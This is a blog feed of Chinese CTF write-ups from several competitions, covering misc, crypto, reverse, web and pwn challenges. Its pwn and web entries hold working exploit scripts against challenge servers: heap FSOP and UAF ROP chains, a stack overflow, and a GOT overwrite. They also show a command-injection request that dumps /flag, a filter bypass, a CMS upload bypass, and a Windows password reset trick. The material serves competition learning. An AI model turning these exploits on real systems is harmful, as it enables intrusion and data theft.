#6#pause()free(3,3)#pause()#free(0,0)add(1,4,2) #3add(1,4,3) #4+0x10add(0,4,1) #5+0x20free(4,3)show(0,0)p.readuntil(&#x27;Note:&#x27;)d=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))libc.address=d-0x21ace0success(f&quot;libc.address: 0x&#123;libc.address:x&#125;&quot;)IO_list_all=libc.sym[&#x27;_IO_list_all&#x27;]xxx=libc.address+0x21b660success(f&quot;IO_list_all: 0x&#123;IO_list_all:x&#125;&quot;)add(1,4,3)free(1,2)free(4,3)show(0,0)p.readuntil(&#x27;Note:&#x27;)chunk_1=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))success(f&quot;chunk_1: 0x&#123;chunk_1:x&#125;&quot;)add(0,1,2)add(2,1,3)show(0,0)p.readuntil(&#x27;Note:&#x27;)large_bin=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))success(f&quot;large bin: 0x&#123;large_bin:x&#125;&quot;)pause()edit(0,0,0,p64(large_bin)*2+p64(IO_list_all-0x20)*2,far=0x531)pause()chunk_0=chunk_1-0x520setcontext=libc.sym[&#x27;setcontext&#x27;]mprotect=libc.sym[&#x27;mprotect&#x27;]wfile_jump=libc.sym[&#x27;_IO_wfile_jumps&#x27;]obstack_jump=libc.address+0x2173c0shellcode=shellcraft.open(&quot;flag&quot;)+shellcraft.read(3,chunk_1,0x300)+shellcraft.write(1,chunk_1,0x300)fake_io_add=chunk_0obstack=fake_io_addcontext=fake_io_add+0xe8shelladd=context+0xe8fake_io=flat(&#123;    0x20: [xxx,xxx,xxx],    0x60: [0,shelladd,0,0,0,0,0,setcontext,0,context,1],    0xd8: obstack_jump+0x20,    0xe0: fake_io_add+0x60,    &#125;,filler=b&#x27;\x00&#x27;)cont=flat(&#123;    0x68: obstack&amp;(~0xfff), # rdi    0x70: 0x1000, # rsi    0x88: 7, # rdx    0xa0: fake_io_add+0x68, # rsp    0xa8: mprotect, # rcx-&gt;rip    0xe0: obstack    &#125;,filler=b&#x27;\x00&#x27;)payload=fake_io[0x20:]+cont+asm(shellcode)free(0,1)add(0,0,1,data=payload.ljust(0x400,b&#x27;\x00&#x27;))free(0,1)add(2,1,3)#free(4,2)#add(1,4,3,data=payload)p.sendline(&#x27;9&#x27;)p.interactive()




httpd// 第一次 直接执行命令，将flag导入到/check/test.html中GET /cat%20/flag%20%3e%63%68%65%63%6b%2f%74%65%73%74%2e%68%74%6d%6c HTTP/1.0Host: 139.155.126.78Content-Length: 7123//第二次GET /check/test.html HTTP/1.0Host: 139.155.126.78Content-Length: 7123




[决赛] 渗透测试
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>羊城杯</tag>
        <tag>2024竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>HSC1th 2022-wp</title>
    <url>/posts/e2c67dcf/</url>
    <content><![CDATA[miscSign-inflag&#123;HSC_W3LC0M3&#125;
DORAEMON
哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？

压缩包先暴力破解出密码为376852
得到一张图片，发现高度不对劲，增加一点高度，看到破损的二维码把定位符补上，扫码得到flag

汝闻,人言否看到压缩包的50 4B 01 02，但是没找到头，搜了一下发现头被改成了4B 50结尾也有一处
提取出来后发现需要密码发现注释qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p观察发现为键盘密码但是第三个字符有点奇怪，不是字母，最后猜测是最像的A密码：WVALOU
解压得到flag，文件头为52 49 46 46，音频文件audacity查看，频谱图中看到flag
PERFORMANCE-ART银河字母+凹凸字体
与表对照，不难发现是50 4B即压缩包解压得到ZmxhZ3tnNUEwIWkyZjF9base64解码得到flag
WIRESHARK下载下来解压提示压缩文件已损坏，看到开头是PK，结尾是IEND，直接foremost，得到一个加密压缩包和一张图片分离出的图片存在lsb隐写，藏了一张图片，save bin导出
发现是一张二维码，扫码得到wrsak..iehr370但是用来解压压缩包提示密码错误，观察后发现前面是wireshark单词的错位，栅栏一下得到wireshark3.7.0
解压后得到一个wireshark文件以%开头，以%%EOF结尾，明显是pdf文件，但是头被删去了一部分，所以打不开
补上PDF，使用wbStego4.3open工具，空密码成功解出flag
webWeb-sign in提示你知道robots协议吗？，访问robots.txt，得到fiag_ls_h3re.php
ctrl+u，F12等被禁用，使用view-source:查看源代码，得到flag
CLICK抓不到包，说明是js控制的逐个查看，最后在main.js中发现一串ZmxhZ3thYzk5Y2M2ZC04NWFmLTRiNmItODNlZS0yYjNjYWMwOTg3Y2J9Cg==，解码得到flag
EXEC题目过滤了一部分字母和符号，但是还可以绕过空格用$&#123;IFS&#125;代替，ls和nl这些字母用\转义,因为是exec，所以最后输出到文件
先找flag文件名和位置
查看flag
CMS SYSTEM首页可以得知是YCCMS,漏洞库查找历史漏洞，发现存在未授权更改密码，任意文件上传等等
更改密码：
文件上传：
分析：LogoUpload.class.php:先将值以.打散为数组，且只检查数组中第二个值是否为png，所以1.png.php即可绕过
private function checkType() &#123;		if (!in_array(explode(&#x27;.&#x27;,$this-&gt;name)[1],$this-&gt;typeArr)) &#123;			Tool::alertBack(&#x27;警告：LOGO图片必须是PNG格式！&#x27;);		&#125;	&#125;
最后文件会被重命名为logo.php
private function setNewName() &#123;		$_nameArr = explode(&#x27;.&#x27;,$this-&gt;name);		$_postfix = $_nameArr[count($_nameArr)-1];		//$_newname = date(&#x27;YmdHis&#x27;).mt_rand(100,1000).&#x27;.&#x27;.$_postfix;		$_newname = &#x27;logo.&#x27;.$_postfix;		$this-&gt;linkpath = UPLOGO.$_newname;		return $this-&gt;path.$_newname;	&#125;

访问php
reversehiahia o(*^▽^*)┛将输入的字符与被flag函数修改过的v4进行比较然后根据flag函数与v4变量的数据得出脚本
脚本如下
a=&quot;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&quot;flag=&quot;&quot;for  i in range(len(a)):    if i&gt;9:            if i%2:                    flag+=chr(ord(a[i])+13)            else:                    flag+=chr(ord(a[i])-11)    else:            if i%2:                    flag+=chr(ord(a[i])+5)            else:                    flag+=chr(ord(a[i])-3)print(flag)


ANDROID安卓逆向的话先安装一下随便输入一个值让它判断一下
随便一个逆向软件中搜索字符串FLAG错误这里用jadx，得到关键代码
代码的大概意思是索引值为单数的异或下一个成员，为双数的异或索引值，
for (int i = 0; i &lt; 17; i++) &#123;            iArr2[i] = i % 2 == 0 ? charArray[i] ^ i : charArray[i] ^ charArray[i + 1];        &#125;

解题代码：
a=[102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]for i in range(len(a)-2,0,-1):    if i%2==1:            a[i]=a[i]^a[i+1]    else:            a[i]=a[i]^iprint(&#x27;&#x27;.join([chr(i) for i in a]))

WAY有壳先脱壳
一个走迷宫的题目
找到地图
OIIIIOOIO#IOOOIIOIOIIIIII
刚好五个分为一组,从左上角走到#用键盘表示路径就是sdsddwd，md5后就是flag了
pwnEz_pwn因为使用了gets函数，没有对输入数据进行限制，所以导致了栈溢出接着执行后门函数获取flag
from pwn import *p=remote(&#x27;hsc2019.site&#x27;,10679)p.sendline(b&#x27;a&#x27;*0x40+b&#x27;b&#x27;*8+p64(0x400741))p.interactive()


EZPWN程序让我们写入地址并向地址写入数据
那么我们可以修改got表 使某个函数执行 后门函数
from pwn import *e=ELF(&#x27;pwn2&#x27;,checksec=0)p=remote(&#x27;hsc2019.site&#x27;,10257)p.sendlineafter(b&#x27;ID?&#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;address?&#x27;,str(e.got[&#x27;puts&#x27;]).encode())p.send(p64(0x400796))p.interactive()


cryptoEasy SignInbase16–&gt;base64–&gt;base32–&gt;base64

flag{welc0me_to_my_s1gn_in}

AFFINE先爆破a和bassert (&quot;flag&quot; in m)表示明文中存在flag然后因为(a*b+c)%62= (a%62)*(b%62)+c%62，所以a和b小于62
# python2import stringimport hashlibletter=string.ascii_letters+string.digitse=&quot;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;a1,b1=0,0for i in range(len(e)-3):    for a in range(62):        for b in range(62):            if ((letter.index(&#x27;f&#x27;)*a+b)%62)==(letter.index(e[i])):                if ((letter.index(&#x27;l&#x27;)*a+b)%62)==(letter.index(e[i+1])):                    if ((letter.index(&#x27;a&#x27;)*a+b)%62)==(letter.index(e[i+2])):                        if ((letter.index(&#x27;g&#x27;)*a+b)%62)==(letter.index(e[i+3])):                            a1,b1=a,bflag=[]for i in e:    for j in range(62):        if (j*a1+b1)%62==letter.index(i):            flag.append(j)            breakprint(hashlib.md5(&#x27;&#x27;.join(letter[i] for i in flag)).hexdigest())
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>HSC</tag>
      </tags>
  </entry>
  <entry>
    <title>2025宁波市第八届网络安全大赛初赛wp</title>
    <url>/posts/1e3f469b/</url>
    <content><![CDATA[misc吾的字节_1二维码图片等距提取像素点并将黑白转成10
from PIL import Imagea = Image.open(&quot;five.png&quot;)x_, y_ = 0, 0w, h = a.sizeb = Image.new(a.mode, (w // 10, h // 10))for x in range(5, w, 10):    for y in range(5, h, 10):        pixel = a.getpixel((x, y))        b.putpixel((x_, y_), pixel)        y_ += 1    x_ += 1    y_ = 0b.save(&quot;1.png&quot;)def image_to_binary_string(image_path):    img = Image.open(image_path).convert(&quot;RGB&quot;)    width, height = img.size    binary_str = &quot;&quot;    for y in range(height):        for x in range(width):            r, g, b = img.getpixel((x, y))            if (r, g, b) == (0, 0, 0):                binary_str += &quot;1&quot;            else:                binary_str += &quot;0&quot;    return binary_strbinary_str = image_to_binary_string(&quot;1.png&quot;)print(binary_str)

根据提示5个一组使用博多码解密
IT WAS A 5-BIT CODE THAT BECAME KNOWN AS THE INTERNATIONAL TELEGRAPH ALPHABET NO 1 (ITA1). SMART YOU HAVE FOUND THIS PLACE AND THE FLAG IS JU5T-A-F1VE6IT-9AME



Infinite_transformation压缩包注释
boom!可能是6位吧密码拆开也许会有别的作用

爆破得到密码121144
用rs打开vmdk文件

ctf.png 的777通道有另一张图片

根据提示也许有一只猫，猜测是爆破参数的猫脸变换
加上最开始提示的密码，猜测a和b的参数是121和144
import osimport cv2import numpy as npdef de_arnold(img, shuffle_time, a, b):    r, c, d = img.shape    dp = np.zeros(img.shape, np.uint8)    for s in range(shuffle_time):        for i in range(r):            for j in range(c):                x = ((a * b + 1) * i - b * j) % r                y = (-a * i + j) % c                dp[x, y, :] = img[i, j, :]        img = np.copy(dp)    return img# 参数设置a, b = 121, 144 # Arnold变换的参数max_attempts = 100 # 爆破的最大尝试次数output_dir = &quot;decrypted_images&quot;  # 输出文件夹os.makedirs(output_dir, exist_ok=True)# 读取加密图片img_en = cv2.imread(&#x27;1.png&#x27;)if img_en is None:    raise FileNotFoundError(&quot;加密图片未找到，请检查路径和文件名是否正确。&quot;)# 开始爆破for shuffle_time in range(1, max_attempts + 1):    img_decrypted = de_arnold(img_en, shuffle_time, a, b)    output_path = os.path.join(output_dir, f&quot;flag_&#123;shuffle_time&#125;.png&quot;)    cv2.imwrite(output_path, img_decrypted)    print(f&quot;解密图片已保存: &#123;output_path&#125;&quot;)print(f&quot;爆破完成，共生成 &#123;max_attempts&#125; 张解密图片，保存在文件夹: &#123;output_dir&#125;&quot;)


另一部分flag.txt根据hint.txt中的提示数字映射函数使用Tupper自我指涉公式做出图像
from functools import reducedef Tuppers_Self_Referential_Formula():    k = 64302039943980618121484184873128503074609076299244422107146064367058121738007282650851520841656649070683123403821937513267391370346165645908933956953599129037238861474390287394253991334205788122863003605507035424785292830536282067025856204240859500900770386319047433635878298987553848841486636769829855797015618861382395619672208366605793866695702843978585628878996390708495917362310741277717465790690657480858197797078816624813513712771929056001109014477328987890335180242509040895793315048815591172058129474723554263040    def f(x, y):        d = ((-17 * x) - (y % 17))        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1        g = ((y // 17) // e) % 2        return 0.5 &lt; g    for y in range(k + 16, k - 1, -1):        line = &quot;&quot;        for x in range(0, 107):            if f(x, y):                line += &quot; ■&quot;            else:                line += &quot;  &quot;        print(line)if __name__ == &#x27;__main__&#x27;:    Tuppers_Self_Referential_Formula()


pwnentity_cache存在uaf
from pwn import *import LibcSearcherdef add(ind,size,data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;Code: &#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;id &gt;&#x27;,str(ind).encode())    p.sendlineafter(b&#x27;size &gt;&#x27;,str(size).encode())    p.sendafter(b&#x27;fragment &gt;&#x27;,data)def edit(ind,data):    p.sendlineafter(b&#x27;Code: &#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;id &gt;&#x27;,str(ind).encode())    p.sendafter(b&#x27;stream &gt;&#x27;,data)def free(ind):    p.sendlineafter(b&#x27;Code: &#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;id &gt;&#x27;,str(ind).encode())def show(ind):    p.sendlineafter(b&#x27;Code: &#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;id &gt; &#x27;,str(ind).encode())#p=process(&#x27;entity_cache&#x27;)p=remote(&#x27;139.155.126.78&#x27;,&#x27;26428&#x27;)p.readuntil(&#x27;[DEBUG INFO]&#x27;)e=ELF(&#x27;./entity_cache&#x27;)libc=ELF(&#x27;./libc.so&#x27;)e.address=int(p.readline(),16)-0xa1aprint(hex(e.address))syscall=e.address+0xbccadd(0,0xf0)add(1,0xf0)add(2,0xf0,&#x27;flag&#x27;)add(3,0xf0,&#x27;/flag&#x27;)free(0)free(1)show(1)heap0=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(heap0))heap3=heap0+0x100*3heap2=heap0+0x100*2edit(1,p64(e.address+0x202060))add(4,0xf0)add(5,0xf0) # cacheedit(5,p64(e.got[&#x27;puts&#x27;]))show(0)puts=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(puts))libc.address=puts-libc.symbols[&#x27;puts&#x27;]env=libc.symbols[&#x27;environ&#x27;]edit(5,p64(env))show(0)stack=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;)[:8])print(hex(stack))edit(5,p64(stack-0x120+8*2))show(0)stack1=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;)[:8])print(hex(stack1))main_stack=stack-0x120+8*2edit(5,p64(main_stack))#gdb.attach(p)pause()rdi=0x000000000002164f+libc.addressrsi=0x0000000000023a6a+libc.addressrdx=0x0000000000001b96+libc.addressrax=0x000000000001b500+libc.addresspayload=b&quot;&quot;payload=p64(rax)+p64(2)+p64(rdi)+p64(heap3)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)payload+=p64(rax)+p64(0)+p64(rdi)+p64(3)+p64(rsi)+p64(heap2)+p64(rdx)+p64(0x50)+p64(syscall)payload+=p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(rsi)+p64(heap2)+p64(rdx)+p64(0x50)+p64(syscall)print(hex(len(payload)))edit(0,payload)p.interactive()


reverseSEA_1伪代码：
int __cdecl main(int argc, const char **argv, const char **envp)&#123;  size_t i; // [esp+190h] [ebp-268h]  int v5[72]; // [esp+19Ch] [ebp-25Ch] BYREF  char v6[44]; // [esp+2BCh] [ebp-13Ch] BYREF  char Buf1[136]; // [esp+2E8h] [ebp-110h] BYREF  char Str[132]; // [esp+370h] [ebp-88h] BYREF  __CheckForDebuggerJustMyCode(&amp;unk_45A019);  memset(Str, 0, 0x80u);  memset(Buf1, 0, 0x80u);  sub_401E00(&quot;Please input the flag and I will verify it: &quot;);  sub_401E70(&quot;%128s&quot;, Str);  strcpy(v6, &quot;58453eec4d16ae234a10b597dfe1f6a6&quot;);  if ( sub_4016B0(v5, v6, 256) )    return -1;  for ( i = 0; i &lt; strlen(Str); i += 16 )  &#123;    if ( sub_401410((int)v5, (int)&amp;Buf1[i], &amp;Str[i]) )      return -1;  &#125;  if ( !memcmp(Buf1, &amp;unk_458014, 0x30u) )    sub_401E00(&quot;Right flag!\n&quot;);  else    sub_401E00(&quot;Wrong flag\n&quot;);  return 0;&#125;

AES加密，密钥是58453eec4d16ae234a10b597dfe1f6a6，密文是unk_458014，dump出来是29708f1980cce40f46abac148d488ca83716fe1d397202797b1999166265623e8f761285cb28e256b381167761e41094
cyberchef解开：DASCTF&#123;75aab2560274ae21aa4554b993e658d1&#125;
flower_world1.txt
97704D -= 120;977070 ^= 0x4Fu;977055 -= 30;977064 -= 93;977048 += 95;97704A += 103;97705C ^= 0x82u;977069 += 52;97705E ^= 3u;977041 += 71;977076 ^= 0xE0u;97706D -= 44;977044 -= 127;977075 -= 71;977060 ^= 0xAAu;97704E -= 119;977062 ^= 0xAu;97707D -= 48;977075 += 55;97705B += 111;97706E ^= 0x32u;97706C -= 92;97705F ^= 0x29u;977041 += 79;97704A += 58;977062 -= 17;97705A += 123;977075 -= 100;97705C -= 64;977056 -= 89;977070 ^= 0x73u;977062 ^= 0x61u;97706E += 118;977062 += 41;977070 += 78;977055 -= 11;97704F ^= 0x5Eu;977070 ^= 0xB2u;977066 -= 66;977046 ^= 0xECu;977062 ^= 0xD1u;977046 -= 99;977069 -= 49;977046 += 32;977066 += 61;977042 ^= 0x42u;977055 += 109;977070 += 14;97707B -= 52;97706E -= 94;977074 += 57;97705D -= 30;97705E -= 107;977048 += 55;97704C -= 27;97706F -= 88;97707A -= 105;977040 += 25;97704C += 73;97706F -= 80;977070 += 125;97706E -= 44;97707A += 11;977068 ^= 0x57u;977062 += 117;977056 += 92;97705B ^= 0x7Au;977043 += 33;977045 ^= 0xC3u;97705E += 19;977064 -= 46;977065 -= 45;977067 ^= 0xB0u;97704F -= 69;977061 ^= 0xDCu;977046 += 69;97707E += 116;97704B ^= 0x22u;977063 ^= 0x7Eu;977054 += 18;977072 -= 11;97704E ^= 5u;97706E += 58;977048 += 44;97706D ^= 0xE4u;977068 -= 30;977063 += 96;977047 -= 49;977062 += 83;97707A += 53;97706A ^= 0x21u;97707C += 49;97705B += 11;977070 -= 105;977063 -= 47;977073 -= 67;977047 += 94;97707E += 78;97704F -= 96;97707A ^= 0xD3u;977043 += 115;97705E -= 127;97707A -= 86;977074 += 32;977067 ^= 0x5Cu;977049 -= 64;97706B ^= 0x8Eu;97707E += 121;977054 -= 98;977074 ^= 0x22u;97704F -= 12;977045 ^= 0x2Du;97707C -= 44;97704D -= 74;977061 ^= 0x82u;977068 ^= 0xEDu;977071 ^= 0xBEu;977077 += 4;97705E -= 120;97704B += 67;977072 -= 52;977042 ^= 0x87u;977067 -= 38;97707B ^= 0xFAu;977072 += 90;97706E -= 9;977077 ^= 0x2Fu;977049 += 83;97706B ^= 0xD6u;977062 -= 6;977048 -= 119;977061 -= 118;977062 -= 75;977068 -= 52;977040 -= 108;97706A += 28;97707C ^= 0x4Cu;97706C ^= 0x4Au;977061 ^= 0xFDu;977063 += 125;977041 ^= 0x6Cu;977075 += 25;977071 -= 7;97707D -= 119;97706F -= 16;977064 += 53;977066 ^= 0x56u;977042 ^= 0xF2u;97706B += 115;977055 -= 37;977072 -= 51;977041 -= 107;97704F -= 116;97705C += 46;977065 -= 67;97704C += 113;977061 += 114;97704E += 69;977060 += 99;977064 ^= 0x88u;977079 -= 37;97705E ^= 0x76u;977070 += 95;97707A += 51;977074 ^= 0xD3u;97704F -= 86;977040 -= 6;97707C -= 8;977071 ^= 0x30u;97705B += 29;977070 += 65;97705D ^= 0xEEu;977047 -= 31;977061 -= 16;977071 += 9;977064 -= 46;977049 ^= 0xDEu;977054 ^= 0x6Du;977065 -= 91;977077 += 119;97707D -= 8;--977061;977075 += 124;977068 += 3;977059 -= 22;977060 ^= 0xD3u;977072 ^= 0xA4u;977040 ^= 0xA8u;97707F += 50;97707E ^= 0x4Du;977070 += 60;97704B += 49;97707B += 3;97706A -= 20;977060 -= 38;977063 -= 2;97707B -= 108;97707E -= 71;97706E += 111;977040 ^= 0xD9u;97704E += 76;97706F ^= 0xF6u;97705B += 26;977040 -= 27;977060 -= 80;977078 -= 27;97705B += 7;++977073;977075 ^= 0xDDu;977043 -= 127;977072 += 116;977069 -= 70;977065 ^= 0x9Bu;977059 -= 34;97704B -= 127;97707F ^= 0xBu;977058 -= 65;97704B ^= 0x83u;977059 ^= 0xB6u;977067 -= 25;977042 -= 94;977061 ^= 0x7Eu;977072 -= 69;977077 -= 72;977060 ^= 0xF7u;977043 -= 11;977069 ^= 0x64u;977075 ^= 0xEu;977073 -= 111;977065 ^= 0x7Au;97706B -= 7;977060 += 103;97707D ^= 0xF4u;977077 += 16;97705C ^= 0x89u;977041 -= 20;97707A ^= 0x3Fu;97704D -= 31;977073 += 98;977073 -= 5;977061 -= 30;97704C += 73;977054 -= 6;977071 ^= 0x56u;97705B ^= 3u;977055 -= 119;97706D += 37;97705E += 4;977044 -= 48;977076 ^= 0xF4u;977053 ^= 0x10u;977059 ^= 0x47u;977060 ^= 0xE2u;97704E -= 16;97705E ^= 0xD2u;977042 += 70;977060 -= 91;977041 ^= 0x12u;977042 -= 81;977047 += 92;977055 -= 77;97705D ^= 0x7Du;977070 ^= 0x4Au;977074 -= 25;977074 -= 127;97704B += 121;97706C += 64;97707A ^= 0x58u;97704B -= 123;977078 += 42;977071 -= 89;97707E ^= 0x99u;977043 -= 6;977045 ^= 0x7Du;977042 -= 14;977064 += 96;977058 += 26;97706E += 54;977052 -= 86;97705D ^= 0x4Eu;977055 -= 15;977078 -= 32;977057 += 75;97706E += 66;977053 += 101;97705E -= 59;97706B ^= 0xFAu;977042 += 93;977073 -= 123;97707C += 31;977064 ^= 0xA2u;977073 -= 32;97705A ^= 0x11u;97707D += 121;977074 -= 99;977054 ^= 0x68u;97706D -= 75;977041 -= 117;977043 += 92;977041 += 88;97704D -= 4;977052 ^= 0x43u;97704B += 8;97706A -= 82;977055 += 56;977049 += 43;977075 ^= 0xD1u;97705D ^= 0x1Bu;977052 -= 74;97707B -= 104;977073 -= 6;977053 -= 120;977043 -= 6;977069 -= 2;97705E ^= 0xFEu;97707E ^= 0x45u;977052 += 5;977068 ^= 0x36u;977051 -= 42;977050 ^= 0xD6u;

d=open(&#x27;1.txt&#x27;).read().splitlines()data=[ 0x7F, 0x11, 0x4A, 0x9D, 0xA5, 0xD5, 0x99, 0x9F, 0xAC, 0xD3,   0xD4, 0xBC, 0x1A, 0x53, 0x46, 0xF4, 0xE7, 0x37, 0x03, 0x60,   0x17, 0xBA, 0x67, 0xAC, 0x09, 0xDA, 0xA0, 0xFB, 0x2D, 0x8E,   0xCB, 0x11, 0x02, 0xC4, 0x17, 0xF7, 0x1B, 0x8F, 0x67, 0x52]e=&#123;&#125;base=0x977040def parse_int(s):  if &#x27;0x&#x27; in s:    return int(s,16)  else:    return int(s)for i in d:  i=i.strip().strip(&#x27;;&#x27;)  if &#x27;-&#x27; in i:    if (&#x27;--&#x27; in i):      value=1      addr=int(i.strip(&#x27;-&#x27;),16)-base    else:      value=parse_int(i.split(&#x27;-=&#x27;)[1].strip(&#x27;;u&#x27;))      addr=int(i.split()[0],16)-base    state=0  elif &#x27;^&#x27; in i:    value=parse_int(i.split(&#x27;^=&#x27;)[1].strip(&#x27;;u&#x27;))    addr=int(i.split()[0],16)-base    state=1  elif &#x27;+&#x27; in i:    if (&#x27;++&#x27; in i):      value=1      addr=int(i.strip(&#x27;+&#x27;),16)-base    else:      value=parse_int(i.split(&#x27;+=&#x27;)[1].strip(&#x27;;u&#x27;))      addr=int(i.split()[0],16)-base    state=2  else:    continue  if (e.get(addr)==None):    e[addr]=[]  e[addr].append((state,value))print(e[0])for i in e:  if i&gt;=len(data):    continue  for state,value in e[i][::-1]:    # print(state,value)    if state==0:      data[i]+=value    elif state==1:      data[i]^=value    elif state==2:      data[i]-=value    data[i]=data[i]&amp;0xffprint(bytes(data))

cryptoThree-prime RSA从 r_cubed 恢复 r
r = int(round(r_cubed ** (1/3)))
从 D 中恢复 (p+q+r) 和 random_num 题目中 random_num 是一个 28 位质数，p+q+r 大约 512~514 位。因为 (p+q+r)*random_num &lt; n，所以 D 没有取模的影响：
random_num = 254766409  # 可通过简单分解D得到s = D // random_num     # 得到 s = p + q + r

求p+q
p_plus_q = s - r
解一元二次方程得到 p 和 q 方程：x^2 - (p+q)x + p*q = 0
from sympy import symbols, solvex = symbols(&#x27;x&#x27;)sols = solve(x**2 - p_plus_q*x + pq, x)p, q = int(sols[0]), int(sols[1])

计算 d 并解密
from Crypto.Util.number import long_to_bytes, inversee = 65537d = inverse(e, (p-1)*(q-1)*(r-1))m = pow(c, d, n)flag = long_to_bytes(m)print(flag)

DASCTF&#123;5521a971-9bed-11ef-bfda-14ac6024b6a8&#125;
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>宁波</tag>
        <tag>2025竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackergame 2021-图之上的信息-wp</title>
    <url>/posts/f5b82e4/</url>
    <content><![CDATA[题目小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？
资料谷歌找到的一篇文章查所有可用的字段
解题先guest&#x2F;guest登陆然后在/graphql接口中查到需要的email字段
最后查询 &#123;&quot;query&quot;:&quot;&#123; user(id:1) &#123; privateEmail &#125;&#125;&quot;&#125; 即可得到 flag。
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>hackergame</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NKCTF-wp</title>
    <url>/posts/50c22730/</url>
    <content><![CDATA[rank：15

Mischard-miscbase32，公众号发NKCTF2023我来了！
blue先导入进vmware，开机发现是windows2008系统，用户带密码
挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符

复制一份cmd到放大镜

左下角启动放大镜功能后就启动了cmd，修改administrator密码

进入系统

easymusic根据提示百度搜到了类似的一题2020天翼杯-音频隐写
使用OpenPuff工具
文件尾得到psdC:01374890
频谱找到PSdB:74208645
波形转换得到psdA:83979367
导出flag.txt

easy_rgbmontage+gaps画图montage *.png -tile 12X15 -geometry +0+0 flag.pnggaps --image=flag.png --generation=30 --population=300 --size=125
得到key：NKCTF2023

r,g,b转成zip
r=open(&#x27;r.txt&#x27;).read()g=open(&#x27;g.txt&#x27;).read()b=open(&#x27;b.txt&#x27;).read()e=&quot;&quot;m=max([len(r),len(b),len(g)])for i in range(m):    try:        e+=r[i]    except:        pass    try:        e+=g[i]    except:        pass    try:        e+=b[i]    except:        passf=open(&#x27;1.zip&#x27;,&#x27;wb&#x27;)f.write(bytes.fromhex(e))print(e)

得到hint：AES-128和data：IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+
在线aes-128解密，key为NKCTF2023
first spam of rabbit year垃圾邮件解密得到佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫
社会主义核心价值观解密得到rabbit 又 move
佛曰加个又，key是rabbit，解密得到密文
&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13

0宽得到key：EnoOoO1G
根据结尾的提示，密文rot47，key rot13
得到U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH和RabBbB1T
在线rabbit得到NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;
misc?iot!参考文章
选择arm little-endian
如果要写地址默认为0x8000000

sub_800014C是rc4生成密钥的过程

复制密钥的过程，得到key：NKCTF2023

从V5开始的18个字节是密文，小端序提取出来：245F02E287A0A76C072A75DA3F8A57D71A1F

